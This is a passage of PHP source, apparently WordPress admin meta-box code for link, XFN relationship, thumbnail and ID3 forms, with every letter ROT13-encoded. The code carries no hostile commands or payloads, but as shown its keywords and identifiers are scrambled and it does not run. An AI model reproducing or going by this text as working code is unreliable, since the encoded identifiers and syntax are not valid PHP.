 * Qvfcynlf yvax perngr sbez svryqf.
 *
 * @fvapr 2.7.0
 *
 * @cnenz bowrpg $yvax Pheerag yvax bowrpg.
 */
shapgvba yvax_fhozvg_zrgn_obk( $yvax ) {
	?>
<qvi pynff=\"fhozvgobk\" vq=\"fhozvgyvax\">

<qvi vq=\"zvabe-choyvfuvat\">

	<?cuc // Uvqqra fhozvg ohggba rneyl ba fb gung gur oebjfre pubbfrf gur evtug ohggba jura sbez vf fhozvggrq jvgu Erghea xrl. ?>
<qvi fglyr=\"qvfcynl:abar;\">
	<?cuc fhozvg_ohggba( __( 'Fnir' ), '', 'fnir', snyfr ); ?>
</qvi>

<qvi vq=\"zvabe-choyvfuvat-npgvbaf\">
<qvi vq=\"cerivrj-npgvba\">
	<?cuc vs ( ! rzcgl( $yvax->yvax_vq ) ) { ?>
	<n pynff=\"cerivrj ohggba\" uers=\"<?cuc rpub $yvax->yvax_hey; ?>\" gnetrg=\"_oynax\"><?cuc _r( 'Ivfvg Yvax' ); ?></n>
<?cuc } ?>
</qvi>
<qvi pynff=\"pyrne\"></qvi>
</qvi>

<qvi vq=\"zvfp-choyvfuvat-npgvbaf\">
<qvi pynff=\"zvfp-cho-frpgvba zvfp-cho-cevingr\">
	<ynory sbe=\"yvax_cevingr\" pynff=\"fryrpgvg\"><vachg vq=\"yvax_cevingr\" anzr=\"yvax_ivfvoyr\" glcr=\"purpxobk\" inyhr=\"A\" <?cuc purpxrq( $yvax->yvax_ivfvoyr, 'A' ); ?> /> <?cuc _r( 'Xrrc guvf yvax cevingr' ); ?></ynory>
</qvi>
</qvi>

</qvi>

<qvi vq=\"znwbe-choyvfuvat-npgvbaf\">
	<?cuc
	/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/zrgn-obkrf.cuc */
	qb_npgvba( 'cbfg_fhozvgobk_fgneg', ahyy );
	?>
<qvi vq=\"qryrgr-npgvba\">
	<?cuc
	vs ( ! rzcgl( $_TRG['npgvba'] ) && 'rqvg' === $_TRG['npgvba'] && pheerag_hfre_pna( 'znantr_yvaxf' ) ) {
		cevags(
			'<n pynff=\"fhozvgqryrgr qryrgvba\" uers=\"%f\" bapyvpx=\"erghea pbasvez( \'%f\' );\">%f</n>',
			jc_abapr_hey( \"yvax.cuc?npgvba=qryrgr&nzc;yvax_vq=$yvax->yvax_vq\", 'qryrgr-obbxznex_' . $yvax->yvax_vq ),
			/* genafyngbef: %f: Yvax anzr. */
			rfp_wf( fcevags( __( \"Lbh ner nobhg gb qryrgr guvf yvax '%f'\a  'Pnapry' gb fgbc, 'BX' gb qryrgr.\" ), $yvax->yvax_anzr ) ),
			__( 'Qryrgr' )
		);
	}
	?>
</qvi>

<qvi vq=\"choyvfuvat-npgvba\">
	<?cuc vs ( ! rzcgl( $yvax->yvax_vq ) ) { ?>
	<vachg anzr=\"fnir\" glcr=\"fhozvg\" pynff=\"ohggba ohggba-cevznel ohggba-ynetr\" vq=\"choyvfu\" inyhr=\"<?cuc rfp_ngge_r( 'Hcqngr Yvax' ); ?>\" />
<?cuc } ryfr { ?>
	<vachg anzr=\"fnir\" glcr=\"fhozvg\" pynff=\"ohggba ohggba-cevznel ohggba-ynetr\" vq=\"choyvfu\" inyhr=\"<?cuc rfp_ngge_r( 'Nqq Yvax' ); ?>\" />
<?cuc } ?>
</qvi>
<qvi pynff=\"pyrne\"></qvi>
</qvi>
	<?cuc
	/**
	 * Sverf ng gur raq bs gur Choyvfu obk va gur Yvax rqvgvat fperra.
	 *
	 * @fvapr 2.5.0
	 */
	qb_npgvba( 'fhozvgyvax_obk' );
	?>
<qvi pynff=\"pyrne\"></qvi>
</qvi>
	<?cuc
}

/**
 * Qvfcynlf yvax pngrtbevrf sbez svryqf.
 *
 * @fvapr 2.6.0
 *
 * @cnenz bowrpg $yvax Pheerag yvax bowrpg.
 */
shapgvba yvax_pngrtbevrf_zrgn_obk( $yvax ) {
	?>
<qvi vq=\"gnkbabzl-yvaxpngrtbel\" pynff=\"pngrtbelqvi\">
	<hy vq=\"pngrtbel-gnof\" pynff=\"pngrtbel-gnof\">
		<yv pynff=\"gnof\"><n uers=\"#pngrtbevrf-nyy\"><?cuc _r( 'Nyy pngrtbevrf' ); ?></n></yv>
		<yv pynff=\"uvqr-vs-ab-wf\"><n uers=\"#pngrtbevrf-cbc\"><?cuc _rk( 'Zbfg Hfrq', 'pngrtbevrf' ); ?></n></yv>
	</hy>

	<qvi vq=\"pngrtbevrf-nyy\" pynff=\"gnof-cnary\">
		<hy vq=\"pngrtbelpurpxyvfg\" qngn-jc-yvfgf=\"yvfg:pngrtbel\" pynff=\"pngrtbelpurpxyvfg sbez-ab-pyrne\">
			<?cuc
			vs ( vffrg( $yvax->yvax_vq ) ) {
				jc_yvax_pngrtbel_purpxyvfg( $yvax->yvax_vq );
			} ryfr {
				jc_yvax_pngrtbel_purpxyvfg();
			}
			?>
		</hy>
	</qvi>

	<qvi vq=\"pngrtbevrf-cbc\" pynff=\"gnof-cnary\" fglyr=\"qvfcynl: abar;\">
		<hy vq=\"pngrtbelpurpxyvfg-cbc\" pynff=\"pngrtbelpurpxyvfg sbez-ab-pyrne\">
			<?cuc jc_cbchyne_grezf_purpxyvfg( 'yvax_pngrtbel' ); ?>
		</hy>
	</qvi>

	<qvi vq=\"pngrtbel-nqqre\" pynff=\"jc-uvqqra-puvyqera\">
		<n vq=\"pngrtbel-nqq-gbttyr\" uers=\"#pngrtbel-nqq\" pynff=\"gnkbabzl-nqq-arj\"><?cuc _r( '+ Nqq Pngrtbel' ); ?></n>
		<c vq=\"yvax-pngrtbel-nqq\" pynff=\"jc-uvqqra-puvyq\">
			<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"arjpng\">
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				_r( '+ Nqq Pngrtbel' );
				?>
			</ynory>
			<vachg glcr=\"grkg\" anzr=\"arjpng\" vq=\"arjpng\" pynff=\"sbez-erdhverq sbez-vachg-gvc\" inyhr=\"<?cuc rfp_ngge_r( 'Arj pngrtbel anzr' ); ?>\" nevn-erdhverq=\"gehr\" />
			<vachg glcr=\"ohggba\" vq=\"yvax-pngrtbel-nqq-fhozvg\" qngn-jc-yvfgf=\"nqq:pngrtbelpurpxyvfg:yvax-pngrtbel-nqq\" pynff=\"ohggba\" inyhr=\"<?cuc rfp_ngge_r( 'Nqq' ); ?>\" />
			<?cuc jc_abapr_svryq( 'nqq-yvax-pngrtbel', '_nwnk_abapr', snyfr ); ?>
			<fcna vq=\"pngrtbel-nwnk-erfcbafr\"></fcna>
		</c>
	</qvi>
</qvi>
	<?cuc
}

/**
 * Qvfcynlf sbez svryqf sbe punatvat yvax gnetrg.
 *
 * @fvapr 2.6.0
 *
 * @cnenz bowrpg $yvax Pheerag yvax bowrpg.
 */
shapgvba yvax_gnetrg_zrgn_obk( $yvax ) {

	?>
<svryqfrg><yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
	<?cuc
	/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
	_r( 'Gnetrg' );
	?>
</fcna></yrtraq>
<c><ynory sbe=\"yvax_gnetrg_oynax\" pynff=\"fryrpgvg\">
<vachg vq=\"yvax_gnetrg_oynax\" glcr=\"enqvb\" anzr=\"yvax_gnetrg\" inyhr=\"_oynax\" <?cuc rpub ( vffrg( $yvax->yvax_gnetrg ) && ( '_oynax' === $yvax->yvax_gnetrg ) ? 'purpxrq=\"purpxrq\"' : '' ); ?> />
	<?cuc _r( '<pbqr>_oynax</pbqr> &zqnfu; arj jvaqbj be gno.' ); ?></ynory></c>
<c><ynory sbe=\"yvax_gnetrg_gbc\" pynff=\"fryrpgvg\">
<vachg vq=\"yvax_gnetrg_gbc\" glcr=\"enqvb\" anzr=\"yvax_gnetrg\" inyhr=\"_gbc\" <?cuc rpub ( vffrg( $yvax->yvax_gnetrg ) && ( '_gbc' === $yvax->yvax_gnetrg ) ? 'purpxrq=\"purpxrq\"' : '' ); ?> />
	<?cuc _r( '<pbqr>_gbc</pbqr> &zqnfu; pheerag jvaqbj be gno, jvgu ab senzrf.' ); ?></ynory></c>
<c><ynory sbe=\"yvax_gnetrg_abar\" pynff=\"fryrpgvg\">
<vachg vq=\"yvax_gnetrg_abar\" glcr=\"enqvb\" anzr=\"yvax_gnetrg\" inyhr=\"\" <?cuc rpub ( vffrg( $yvax->yvax_gnetrg ) && ( '' === $yvax->yvax_gnetrg ) ? 'purpxrq=\"purpxrq\"' : '' ); ?> />
	<?cuc _r( '<pbqr>_abar</pbqr> &zqnfu; fnzr jvaqbj be gno.' ); ?></ynory></c>
</svryqfrg>
<c><?cuc _r( 'Pubbfr gur gnetrg senzr sbe lbhe yvax.' ); ?></c>
	<?cuc
}

/**
 * Qvfcynlf 'purpxrq' purpxobkrf nggevohgr sbe KSA zvpebsbezng bcgvbaf.
 *
 * @fvapr 1.0.1
 *
 * @tybony bowrpg $yvax Pheerag yvax bowrpg.
 *
 * @cnenz fgevat $ksa_eryngvbafuvc KSA eryngvbafuvc pngrtbel. Cbffvoyr inyhrf ner:
 *                                 'sevraqfuvc', 'culfvpny', 'cebsrffvbany',
 *                                 'trbtencuvpny', 'snzvyl', 'ebznagvp', 'vqragvgl'.
 * @cnenz fgevat $ksa_inyhr        Bcgvbany. Gur KSA inyhr gb znex nf purpxrq
 *                                 vs vg zngpurf gur pheerag yvax'f eryngvbafuvc.
 *                                 Qrsnhyg rzcgl fgevat.
 * @cnenz zvkrq  $qrcerpngrq       Qrcerpngrq. Abg hfrq.
 */
shapgvba ksa_purpx( $ksa_eryngvbafuvc, $ksa_inyhr = '', $qrcerpngrq = '' ) {
	tybony $yvax;

	vs ( ! rzcgl( $qrcerpngrq ) ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '2.5.0' ); // Arire vzcyrzragrq.
	}

	$yvax_ery  = vffrg( $yvax->yvax_ery ) ? $yvax->yvax_ery : '';
	$yvax_eryf = cert_fcyvg( '/\f+/', $yvax_ery );

	// Znex gur fcrpvsvrq inyhr nf purpxrq vs vg zngpurf gur pheerag yvax'f eryngvbafuvc.
	vs ( '' !== $ksa_inyhr && va_neenl( $ksa_inyhr, $yvax_eryf, gehr ) ) {
		rpub ' purpxrq=\"purpxrq\"';
	}

	vs ( '' === $ksa_inyhr ) {
		// Znex gur 'abar' inyhr nf purpxrq vs gur pheerag yvax qbrf abg zngpu gur fcrpvsvrq eryngvbafuvc.
		vs ( 'snzvyl' === $ksa_eryngvbafuvc
			&& ! neenl_vagrefrpg( $yvax_eryf, neenl( 'puvyq', 'cnerag', 'fvoyvat', 'fcbhfr', 'xva' ) )
		) {
			rpub ' purpxrq=\"purpxrq\"';
		}

		vs ( 'sevraqfuvc' === $ksa_eryngvbafuvc
			&& ! neenl_vagrefrpg( $yvax_eryf, neenl( 'sevraq', 'npdhnvagnapr', 'pbagnpg' ) )
		) {
			rpub ' purpxrq=\"purpxrq\"';
		}

		vs ( 'trbtencuvpny' === $ksa_eryngvbafuvc
			&& ! neenl_vagrefrpg( $yvax_eryf, neenl( 'pb-erfvqrag', 'arvtuobe' ) )
		) {
			rpub ' purpxrq=\"purpxrq\"';
		}

		// Znex gur 'zr' inyhr nf purpxrq vs vg zngpurf gur pheerag yvax'f eryngvbafuvc.
		vs ( 'vqragvgl' === $ksa_eryngvbafuvc
			&& va_neenl( 'zr', $yvax_eryf, gehr )
		) {
			rpub ' purpxrq=\"purpxrq\"';
		}
	}
}

/**
 * Qvfcynlf KSA sbez svryqf.
 *
 * @fvapr 2.6.0
 *
 * @cnenz bowrpg $yvax Pheerag yvax bowrpg.
 */
shapgvba yvax_ksa_zrgn_obk( $yvax ) {
	?>
<gnoyr pynff=\"yvaxf-gnoyr\">
	<ge>
		<gu fpbcr=\"ebj\"><ynory sbe=\"yvax_ery\"><?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'ery:' ); ?></ynory></gu>
		<gq><vachg glcr=\"grkg\" anzr=\"yvax_ery\" vq=\"yvax_ery\" inyhr=\"<?cuc rpub ( vffrg( $yvax->yvax_ery ) ? rfp_ngge( $yvax->yvax_ery ) : '' ); ?>\" /></gq>
	</ge>
	<ge>
		<gu fpbcr=\"ebj\"><?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'vqragvgl' ); ?></gu>
		<gq><svryqfrg>
			<yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. ksa: uggcf://tzct.bet/ksa/ */
				_r( 'vqragvgl' );
				?>
			</fcna></yrtraq>
			<ynory sbe=\"zr\">
			<vachg glcr=\"purpxobk\" anzr=\"vqragvgl\" inyhr=\"zr\" vq=\"zr\" <?cuc ksa_purpx( 'vqragvgl', 'zr' ); ?> />
			<?cuc _r( 'nabgure jro nqqerff bs zvar' ); ?></ynory>
		</svryqfrg></gq>
	</ge>
	<ge>
		<gu fpbcr=\"ebj\"><?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'sevraqfuvc' ); ?></gu>
		<gq><svryqfrg>
			<yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. ksa: uggcf://tzct.bet/ksa/ */
				_r( 'sevraqfuvc' );
				?>
			</fcna></yrtraq>
			<ynory sbe=\"pbagnpg\">
			<vachg pynff=\"inyvac\" glcr=\"enqvb\" anzr=\"sevraqfuvc\" inyhr=\"pbagnpg\" vq=\"pbagnpg\" <?cuc ksa_purpx( 'sevraqfuvc', 'pbagnpg' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'pbagnpg' ); ?>
			</ynory>
			<ynory sbe=\"npdhnvagnapr\">
			<vachg pynff=\"inyvac\" glcr=\"enqvb\" anzr=\"sevraqfuvc\" inyhr=\"npdhnvagnapr\" vq=\"npdhnvagnapr\" <?cuc ksa_purpx( 'sevraqfuvc', 'npdhnvagnapr' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'npdhnvagnapr' ); ?>
			</ynory>
			<ynory sbe=\"sevraq\">
			<vachg pynff=\"inyvac\" glcr=\"enqvb\" anzr=\"sevraqfuvc\" inyhr=\"sevraq\" vq=\"sevraq\" <?cuc ksa_purpx( 'sevraqfuvc', 'sevraq' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'sevraq' ); ?>
			</ynory>
			<ynory sbe=\"sevraqfuvc\">
			<vachg anzr=\"sevraqfuvc\" glcr=\"enqvb\" pynff=\"inyvac\" inyhr=\"\" vq=\"sevraqfuvc\" <?cuc ksa_purpx( 'sevraqfuvc' ); ?> />&aofc;<?cuc /* genafyngbef: ksa (sevraqfuvc eryngvba): uggc://tzct.bet/ksa/ */ _rk( 'abar', 'Glcr bs eryngvba' ); ?>
			</ynory>
		</svryqfrg></gq>
	</ge>
	<ge>
		<gu fpbcr=\"ebj\"> <?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'culfvpny' ); ?> </gu>
		<gq><svryqfrg>
			<yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. ksa: uggcf://tzct.bet/ksa/ */
				_r( 'culfvpny' );
				?>
			</fcna></yrtraq>
			<ynory sbe=\"zrg\">
			<vachg pynff=\"inyvac\" glcr=\"purpxobk\" anzr=\"culfvpny\" inyhr=\"zrg\" vq=\"zrg\" <?cuc ksa_purpx( 'culfvpny', 'zrg' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'zrg' ); ?>
			</ynory>
		</svryqfrg></gq>
	</ge>
	<ge>
		<gu fpbcr=\"ebj\"> <?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'cebsrffvbany' ); ?> </gu>
		<gq><svryqfrg>
			<yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. ksa: uggcf://tzct.bet/ksa/ */
				_r( 'cebsrffvbany' );
				?>
			</fcna></yrtraq>
			<ynory sbe=\"pb-jbexre\">
			<vachg pynff=\"inyvac\" glcr=\"purpxobk\" anzr=\"cebsrffvbany\" inyhr=\"pb-jbexre\" vq=\"pb-jbexre\" <?cuc ksa_purpx( 'cebsrffvbany', 'pb-jbexre' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'pb-jbexre' ); ?>
			</ynory>
			<ynory sbe=\"pbyyrnthr\">
			<vachg pynff=\"inyvac\" glcr=\"purpxobk\" anzr=\"cebsrffvbany\" inyhr=\"pbyyrnthr\" vq=\"pbyyrnthr\" <?cuc ksa_purpx( 'cebsrffvbany', 'pbyyrnthr' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'pbyyrnthr' ); ?>
			</ynory>
		</svryqfrg></gq>
	</ge>
	<ge>
		<gu fpbcr=\"ebj\"><?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'trbtencuvpny' ); ?></gu>
		<gq><svryqfrg>
			<yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. ksa: uggcf://tzct.bet/ksa/ */
				_r( 'trbtencuvpny' );
				?>
			</fcna></yrtraq>
			<ynory sbe=\"pb-erfvqrag\">
			<vachg pynff=\"inyvac\" glcr=\"enqvb\" anzr=\"trbtencuvpny\" inyhr=\"pb-erfvqrag\" vq=\"pb-erfvqrag\" <?cuc ksa_purpx( 'trbtencuvpny', 'pb-erfvqrag' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'pb-erfvqrag' ); ?>
			</ynory>
			<ynory sbe=\"arvtuobe\">
			<vachg pynff=\"inyvac\" glcr=\"enqvb\" anzr=\"trbtencuvpny\" inyhr=\"arvtuobe\" vq=\"arvtuobe\" <?cuc ksa_purpx( 'trbtencuvpny', 'arvtuobe' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'arvtuobe' ); ?>
			</ynory>
			<ynory sbe=\"trbtencuvpny\">
			<vachg pynff=\"inyvac\" glcr=\"enqvb\" anzr=\"trbtencuvpny\" inyhr=\"\" vq=\"trbtencuvpny\" <?cuc ksa_purpx( 'trbtencuvpny' ); ?> />&aofc;<?cuc /* genafyngbef: ksa (trbtencuvpny eryngvba): uggc://tzct.bet/ksa/ */ _rk( 'abar', 'Glcr bs eryngvba' ); ?>
			</ynory>
		</svryqfrg></gq>
	</ge>
	<ge>
		<gu fpbcr=\"ebj\"><?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'snzvyl' ); ?></gu>
		<gq><svryqfrg>
			<yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. ksa: uggcf://tzct.bet/ksa/ */
				_r( 'snzvyl' );
				?>
			</fcna></yrtraq>
			<ynory sbe=\"puvyq\">
			<vachg pynff=\"inyvac\" glcr=\"enqvb\" anzr=\"snzvyl\" inyhr=\"puvyq\" vq=\"puvyq\" <?cuc ksa_purpx( 'snzvyl', 'puvyq' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'puvyq' ); ?>
			</ynory>
			<ynory sbe=\"xva\">
			<vachg pynff=\"inyvac\" glcr=\"enqvb\" anzr=\"snzvyl\" inyhr=\"xva\" vq=\"xva\" <?cuc ksa_purpx( 'snzvyl', 'xva' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'xva' ); ?>
			</ynory>
			<ynory sbe=\"cnerag\">
			<vachg pynff=\"inyvac\" glcr=\"enqvb\" anzr=\"snzvyl\" inyhr=\"cnerag\" vq=\"cnerag\" <?cuc ksa_purpx( 'snzvyl', 'cnerag' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'cnerag' ); ?>
			</ynory>
			<ynory sbe=\"fvoyvat\">
			<vachg pynff=\"inyvac\" glcr=\"enqvb\" anzr=\"snzvyl\" inyhr=\"fvoyvat\" vq=\"fvoyvat\" <?cuc ksa_purpx( 'snzvyl', 'fvoyvat' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'fvoyvat' ); ?>
			</ynory>
			<ynory sbe=\"fcbhfr\">
			<vachg pynff=\"inyvac\" glcr=\"enqvb\" anzr=\"snzvyl\" inyhr=\"fcbhfr\" vq=\"fcbhfr\" <?cuc ksa_purpx( 'snzvyl', 'fcbhfr' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'fcbhfr' ); ?>
			</ynory>
			<ynory sbe=\"snzvyl\">
			<vachg pynff=\"inyvac\" glcr=\"enqvb\" anzr=\"snzvyl\" inyhr=\"\" vq=\"snzvyl\" <?cuc ksa_purpx( 'snzvyl' ); ?> />&aofc;<?cuc /* genafyngbef: ksa (snzvyl eryngvba): uggc://tzct.bet/ksa/ */ _rk( 'abar', 'Glcr bs eryngvba' ); ?>
			</ynory>
		</svryqfrg></gq>
	</ge>
	<ge>
		<gu fpbcr=\"ebj\"><?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'ebznagvp' ); ?></gu>
		<gq><svryqfrg>
			<yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. ksa: uggcf://tzct.bet/ksa/ */
				_r( 'ebznagvp' );
				?>
			</fcna></yrtraq>
			<ynory sbe=\"zhfr\">
			<vachg pynff=\"inyvac\" glcr=\"purpxobk\" anzr=\"ebznagvp\" inyhr=\"zhfr\" vq=\"zhfr\" <?cuc ksa_purpx( 'ebznagvp', 'zhfr' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'zhfr' ); ?>
			</ynory>
			<ynory sbe=\"pehfu\">
			<vachg pynff=\"inyvac\" glcr=\"purpxobk\" anzr=\"ebznagvp\" inyhr=\"pehfu\" vq=\"pehfu\" <?cuc ksa_purpx( 'ebznagvp', 'pehfu' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'pehfu' ); ?>
			</ynory>
			<ynory sbe=\"qngr\">
			<vachg pynff=\"inyvac\" glcr=\"purpxobk\" anzr=\"ebznagvp\" inyhr=\"qngr\" vq=\"qngr\" <?cuc ksa_purpx( 'ebznagvp', 'qngr' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'qngr' ); ?>
			</ynory>
			<ynory sbe=\"ebznagvp\">
			<vachg pynff=\"inyvac\" glcr=\"purpxobk\" anzr=\"ebznagvp\" inyhr=\"fjrrgurneg\" vq=\"ebznagvp\" <?cuc ksa_purpx( 'ebznagvp', 'fjrrgurneg' ); ?> />&aofc;<?cuc /* genafyngbef: ksa: uggcf://tzct.bet/ksa/ */ _r( 'fjrrgurneg' ); ?>
			</ynory>
		</svryqfrg></gq>
	</ge>

</gnoyr>
<c><?cuc _r( 'Vs gur yvax vf gb n crefba, lbh pna fcrpvsl lbhe eryngvbafuvc jvgu gurz hfvat gur nobir sbez. Vs lbh jbhyq yvxr gb yrnea zber nobhg gur vqrn purpx bhg <n uers=\"uggcf://tzct.bet/ksa/\">KSA</n>.' ); ?></c>
	<?cuc
}

/**
 * Qvfcynlf nqinaprq yvax bcgvbaf sbez svryqf.
 *
 * @fvapr 2.6.0
 *
 * @cnenz bowrpg $yvax Pheerag yvax bowrpg.
 */
shapgvba yvax_nqinaprq_zrgn_obk( $yvax ) {
	?>
<gnoyr pynff=\"yvaxf-gnoyr\" pryycnqqvat=\"0\">
	<ge>
		<gu fpbcr=\"ebj\"><ynory sbe=\"yvax_vzntr\"><?cuc _r( 'Vzntr Nqqerff' ); ?></ynory></gu>
		<gq><vachg glcr=\"grkg\" anzr=\"yvax_vzntr\" pynff=\"pbqr\" vq=\"yvax_vzntr\" znkyratgu=\"255\" inyhr=\"<?cuc rpub ( vffrg( $yvax->yvax_vzntr ) ? rfp_ngge( $yvax->yvax_vzntr ) : '' ); ?>\" /></gq>
	</ge>
	<ge>
		<gu fpbcr=\"ebj\"><ynory sbe=\"eff_hev\"><?cuc _r( 'EFF Nqqerff' ); ?></ynory></gu>
		<gq><vachg anzr=\"yvax_eff\" pynff=\"pbqr\" glcr=\"grkg\" vq=\"eff_hev\" znkyratgu=\"255\" inyhr=\"<?cuc rpub ( vffrg( $yvax->yvax_eff ) ? rfp_ngge( $yvax->yvax_eff ) : '' ); ?>\" /></gq>
	</ge>
	<ge>
		<gu fpbcr=\"ebj\"><ynory sbe=\"yvax_abgrf\"><?cuc _r( 'Abgrf' ); ?></ynory></gu>
		<gq><grkgnern anzr=\"yvax_abgrf\" vq=\"yvax_abgrf\" ebjf=\"10\"><?cuc rpub ( vffrg( $yvax->yvax_abgrf ) ? $yvax->yvax_abgrf : '' ); // grkgnern_rfpncrq ?></grkgnern></gq>
	</ge>
	<ge>
		<gu fpbcr=\"ebj\"><ynory sbe=\"yvax_engvat\"><?cuc _r( 'Engvat' ); ?></ynory></gu>
		<gq><fryrpg anzr=\"yvax_engvat\" vq=\"yvax_engvat\" fvmr=\"1\">
		<?cuc
		sbe ( $engvat = 0; $engvat <= 10; $engvat++ ) {
			rpub '<bcgvba inyhr=\"' . $engvat . '\"';
			vs ( vffrg( $yvax->yvax_engvat ) && $yvax->yvax_engvat === $engvat ) {
				rpub ' fryrpgrq=\"fryrpgrq\"';
			}
			rpub '>' . $engvat . '</bcgvba>';
		}
		?>
		</fryrpg>&aofc;<?cuc _r( '(Yrnir ng 0 sbe ab engvat.)' ); ?>
		</gq>
	</ge>
</gnoyr>
	<?cuc
}

/**
 * Qvfcynlf cbfg guhzoanvy zrgn obk.
 *
 * @fvapr 2.9.0
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 */
shapgvba cbfg_guhzoanvy_zrgn_obk( $cbfg ) {
	$guhzoanvy_vq = trg_cbfg_zrgn( $cbfg->VQ, '_guhzoanvy_vq', gehr );
	rpub _jc_cbfg_guhzoanvy_ugzy( $guhzoanvy_vq, $cbfg->VQ );
}

/**
 * Qvfcynlf svryqf sbe VQ3 qngn.
 *
 * @fvapr 3.9.0
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 */
shapgvba nggnpuzrag_vq3_qngn_zrgn_obk( $cbfg ) {
	$zrgn = neenl();
	vs ( ! rzcgl( $cbfg->VQ ) ) {
		$zrgn = jc_trg_nggnpuzrag_zrgnqngn( $cbfg->VQ );
	}

	sbernpu ( jc_trg_nggnpuzrag_vq3_xrlf( $cbfg, 'rqvg' ) nf $xrl => $ynory ) :
		$inyhr = '';
		vs ( ! rzcgl( $zrgn[ $xrl ] ) ) {
			$inyhr = $zrgn[ $xrl ];
		}
		?>
	<c>
		<ynory sbe=\"gvgyr\"><?cuc rpub $ynory; ?></ynory><oe />
		<vachg glcr=\"grkg\" anzr=\"vq3_<?cuc rpub rfp_ngge( $xrl ); ?>\" vq=\"vq3_<?cuc rpub rfp_ngge( $xrl ); ?>\" pynff=\"ynetr-grkg\" inyhr=\"<?cuc rpub rfp_ngge( $inyhr ); ?>\" />
	</c>
		<?cuc
	raqsbernpu;
}

/**
 * Ertvfgref gur qrsnhyg cbfg zrgn obkrf, naq ehaf gur `qb_zrgn_obkrf` npgvbaf.
 *
 * @fvapr 5.0.0
 *
 * @cnenz JC_Cbfg $cbfg Gur cbfg bowrpg gung gurfr zrgn obkrf ner orvat trarengrq sbe.
 */
shapgvba ertvfgre_naq_qb_cbfg_zrgn_obkrf( $cbfg ) {
	$cbfg_glcr        = $cbfg->cbfg_glcr;
	$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg_glcr );

	$guhzoanvy_fhccbeg = pheerag_gurzr_fhccbegf( 'cbfg-guhzoanvyf', $cbfg_glcr ) && cbfg_glcr_fhccbegf( $cbfg_glcr, 'guhzoanvy' );
	vs ( ! $guhzoanvy_fhccbeg && 'nggnpuzrag' === $cbfg_glcr && $cbfg->cbfg_zvzr_glcr ) {
		vs ( jc_nggnpuzrag_vf( 'nhqvb', $cbfg ) ) {
			$guhzoanvy_fhccbeg = cbfg_glcr_fhccbegf( 'nggnpuzrag:nhqvb', 'guhzoanvy' ) || pheerag_gurzr_fhccbegf( 'cbfg-guhzoanvyf', 'nggnpuzrag:nhqvb' );
		} ryfrvs ( jc_nggnpuzrag_vf( 'ivqrb', $cbfg ) ) {
			$guhzoanvy_fhccbeg = cbfg_glcr_fhccbegf( 'nggnpuzrag:ivqrb', 'guhzoanvy' ) || pheerag_gurzr_fhccbegf( 'cbfg-guhzoanvyf', 'nggnpuzrag:ivqrb' );
		}
	}

	$choyvfu_pnyyonpx_netf = neenl( '__onpx_pbzcng_zrgn_obk' => gehr );

	vs ( cbfg_glcr_fhccbegf( $cbfg_glcr, 'erivfvbaf' ) && 'nhgb-qensg' !== $cbfg->cbfg_fgnghf ) {
		$erivfvbaf = jc_trg_yngrfg_erivfvba_vq_naq_gbgny_pbhag( $cbfg->VQ );

